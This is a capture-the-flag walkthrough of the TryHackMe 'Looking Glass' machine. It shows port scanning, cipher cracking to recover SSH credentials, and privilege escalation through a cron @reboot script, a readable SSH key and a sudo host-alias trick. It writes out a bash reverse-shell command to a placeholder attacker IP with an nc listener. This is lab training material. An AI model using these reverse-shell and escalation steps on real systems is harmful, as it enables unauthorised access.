# Looking Glass


`nmap -Pn 10.10.255.64` output is are open ports 22, 9000-13999
```sh
9000/tcp open  unknown
[...]
13999/tcp open  unknown
```

Some further scanning via `nmap -sC -sV -p 9000-13999 10.10.255.64` uncovers these are all dropbear-ssh servers
```sh
9000/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
[...]
13999/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
```

Establishing a connection via `ssh 10.10.255.64 -p 10000` yields
```sh
Unable to negotiate with 10.10.255.64 port 10000: no matching host key type found. Their offer: ssh-rsa
```
* Option `ssh 10.10.255.64 -p 10000 -oHostKeyAlgorithms=+ssh-rsa`
```
Lower
Connection to 10.10.255.64 closed.
```
![Alt text](../include/looking_glass/norsa.png?raw=true "ssh connection")

Checking the highest and lowest ports seems off. The given hints of higher/lower are inverted. 
![Alt text](../include/looking_glass/something_off.png?raw=true "something seems off")

Regardless of this fact, following the of `O(log n)` method of divide and conquer from inside the hint leads to success on port 12147
![Alt text](../include/looking_glass/success.png?raw=true "found it")

Visible is the `Jabberwocky` text but it is encoded. Having done one or two stego challenges before leads me to believe it is either some rotational subsitution cipher or it is a vignere cipher, on the first look. The key would be `Jabberwocky`, I guess. 

So, first let's search for the jabberwocky poem.
![Alt text](https://i.pinimg.com/736x/43/0b/45/430b4526079e14b088d82c8d1c75cbcc.jpg "jabberwocky poem")

After pasting the first paragraph into the good ol [dcode.fr](https://www.dcode.fr/vigenere-cipher) and put in the first line of the poem a plain text word , I get a rough outline of the key 
![Alt text](../include/looking_glass/key_outline.png?raw=true "rough key outline")

Fiddling with the key on [boxentriq](https://www.boxentriq.com/code-breaking/vigenere-cipher) yields the key, finally. The secret is inside the poem.
![Alt text](../include/looking_glass/cipher_key.png?raw=true "cipher key")

This returns the credentials for ssh connection
```sh
jabberwock:HappenedWaterExplainedArrived
```
![Alt text](../include/looking_glass/ssh_credentials.png?raw=true "ssh credentials")

Once logged in `user.txt` contains the key, but it has to be reversed.
![Alt text](../include/looking_glass/reverse_flag.png?raw=true "reversed flag")

Taking a look `twasBrillig.sh`. I can spread the word about Jabberwocky.
```sh
jabberwock@looking-glass:~$ cat twasBrillig.sh
wall $(cat /home/jabberwock/poem.txt)
jabberwock@looking-glass:~$ ls -l
total 12
-rw-rw-r-- 1 jabberwock jabberwock 935 Jun 30  2020 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock  38 Jul  3  2020 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock  38 Jul  3  2020 user.txt
```

Checking `sudo -l`. Looks like a case for [gtfobins](https://gtfobins.github.io).
```sh
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

Well, it doesn't. Let's do some further research.
```sh
jabberwock@looking-glass:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
```
```sh
jabberwock@looking-glass:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
jabberwock@looking-glass:~$ uname -a
Linux looking-glass 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Here it is, on reboot tweedledum executes `twasBrillig.sh`
```sh
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

Lets prepare a reverse shell.
```sh
jabberwock@looking-glass:~$ echo "bash -i &> /dev/tcp/<attacker-IP>/4448 0>&1" > twasBrillig.sh
```

Prepare a reverse shell.
```sh
nc -lvnp 4448
```

Reboot and wait
```sh
sudo /sbin/reboot
```

After the shell established the connection, there are the following files inside `/home/tweedledum`
```sh
tweedledum@looking-glass:~$ ls -l
ls -l
total 12
-rw-rw-r-- 1 tweedledum tweedledum 148 Oct 15 20:18 1
-rw-r--r-- 1 root       root       520 Jul  3  2020 humptydumpty.txt
-rw-r--r-- 1 root       root       296 Jul  3  2020 poem.txt
tweedledum@looking-glass:~$ cat poe 
cat poem.txt 
     'Tweedledum and Tweedledee
      Agreed to have a battle;
     For Tweedledum said Tweedledee
      Had spoiled his nice new rattle.

     Just then flew down a monstrous crow,
      As black as a tar-barrel;
     Which frightened both the heroes so,
      They quite forgot their quarrel.'
tweedledum@looking-glass:~$ cat hump    
cat humptydumpty.txt 
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```
`humptydumpty.txt` looks like the text is in hex. Decode, and there is the password.
![Alt text](../include/looking_glass/humptydumpty_passwd.png?raw=true "humpty password")

The output is garbage for the most part, but I was able to see the password. For now I don't care about the other lines. Let's do a shell upgrade and switch users.
![Alt text](../include/looking_glass/humpty_user.png?raw=true "humpty user")


I solved the login for user alice in a few seconds. Always check file permissions! The home directory is executable, that means I can change directory, but I cannot invoke binaries to read inside like `/bin/ls`. The directory permissions do not prevent from reading files inside it, necessarily. What are defacto standard file names inside a home directory? There is `.bashrc` most of the time, `.profile` as well. Also, there is `.bash_history`. But, if you generate your ssh keys via `ssh-keygen` the default file name is `id_rsa` inside `~/.ssh`. 
![Alt text](../include/looking_glass/alice_key.png?raw=true "alice's key")

Establish another ssh connection via `ssh alice@10.10.42.140 -i alice`. There is another file called `kitten.txt`.
![Alt text](../include/looking_glass/alice_login.png?raw=true "login as alice")

I do not know the password of alice, but she is in the sudoers file
```sh
alice@looking-glass:~$ ll  /etc/sudoers.d
total 24
drwxr-xr-x  2 root root 4096 Jul  3  2020 ./
drwxr-xr-x 91 root root 4096 Oct 15 20:49 ../
-r--r-----  1 root root  958 Jan 18  2018 README
-r--r--r--  1 root root   49 Jul  3  2020 alice
-r--r-----  1 root root   57 Jul  3  2020 jabberwock
-r--r-----  1 root root  120 Jul  3  2020 tweedles
alice@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```
The host alias `ssalg-gnikool` is a reversed `lookin-glass`. Just executing `sudo ssalg-gnikool` does not work. I took a look inside the options of sudo, there is an option to set the host by using `-h` has the parameter.
![Alt text](../include/looking_glass/hostname.png?raw=true "reversed hostname")

Let's switch to root and reverse the flag
![Alt text](../include/looking_glass/reverse_root_flag.png?raw=true "reversed root flag")

